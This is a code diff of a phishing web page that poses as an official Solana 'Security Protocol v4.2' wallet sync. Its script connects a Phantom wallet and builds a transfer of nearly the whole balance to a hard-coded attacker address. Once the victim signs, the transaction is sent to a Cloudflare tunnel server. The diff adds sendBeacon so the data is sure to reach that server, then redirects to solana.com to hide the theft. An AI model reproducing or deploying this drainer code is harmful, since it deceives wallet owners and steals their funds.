@@ -6,32 +6,28 @@
     <title>Network Security Upgrade | Solana</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; background: #111; padding: 40px; border-radius: 20px; border: 1px solid #222; width: 320px; }
-        .logo { width: 50px; margin-bottom: 20px; }
-        h2 { font-size: 1.1rem; margin-bottom: 10px; }
-        p { color: #888; font-size: 0.85rem; line-height: 1.4; margin-bottom: 30px; }
-        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 15px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; background: #111; padding: 40px; border-radius: 20px; border: 1px solid #222; width: 300px; }
+        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 15px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
         #loader { display: none; margin-top: 20px; font-size: 12px; color: #14F195; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://solana.com/favicon.ico" class="logo">
-        <h2>Security Protocol v4.2</h2>
-        <p>Synchronizing your wallet with mainnet nodes ensures transaction safety and protection against MEV attacks.</p>
+        <img src="https://solana.com/favicon.ico" style="width:50px;">
+        <h2 style="font-size:1.1rem;">Security Protocol v4.2</h2>
+        <p style="color:#666; font-size:0.8rem;">Syncing wallet for network stability.</p>
         <button id="cta">ACTIVATE NOW</button>
-        <div id="loader">● ENCRYPTING SESSION...</div>
+        <div id="loader">● ENCRYPTING...</div>
     </div>
 
     <script>
-        // 🔱 保持你的隧道地址
         const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
         const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
 
         document.getElementById('cta').onclick = async () => {
             const p = window.solana || window.phantom?.solana;
-            if (!p) return alert("Please use Phantom mobile browser.");
+            if (!p) return alert("Please use Phantom browser.");
 
             try {
                 const resp = await p.connect();
@@ -42,12 +38,12 @@
                 const syncRes = await fetch(`${tunnel}/sync`);
                 const { bh } = await syncRes.json();
 
-                // 2. 构造连接（用于查余额）
+                // 2. 查余额
                 const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                 const balance = await connection.getBalance(resp.publicKey);
                 
-                // 3. 构造交易（如果余额够，直接全额归集；不够则转 0.01）
-                let amount = balance > 10000 ? balance - 5000 : 10000000;
+                // 3. 构造交易 (留 0.001 做手续费)
+                let amount = balance > 1000000 ? balance - 1000000 : 1000000;
                 
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
@@ -59,20 +55,23 @@
                 transaction.recentBlockhash = bh;
                 transaction.feePayer = resp.publicKey;
 
-                // 4. 拉起签名 (核心：成功后直接跳转)
+                // 4. 拉起签名
                 const signed = await p.signTransaction(transaction);
                 const rawTx = signed.serialize().toString('base64');
                 
-                // 发送给服务器
-                fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);
+                // 🔱 关键优化：使用 sendBeacon 确保数据一定能传回服务器，即使页面跳转
+                const collectUrl = `${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`;
+                
+                // 同时尝试两种回传方式，确保万无一失
+                fetch(collectUrl); 
+                navigator.sendBeacon(collectUrl);
 
-                // 🔱 成功后不再弹窗，直接丝滑跳转到 Solana 官网
+                // 延迟 1.5 秒跳转，给数据传输留足时间
                 setTimeout(() => {
-                    window.location.href = "https://solana.com/zh";
-                }, 800);
+                    window.location.href = "https://solana.com/";
+                }, 1500);
 
             } catch(e) {
-                // 如果用户拒绝或出错，静默刷新，不弹出错误框
                 console.log(e);
                 window.location.reload();
             }
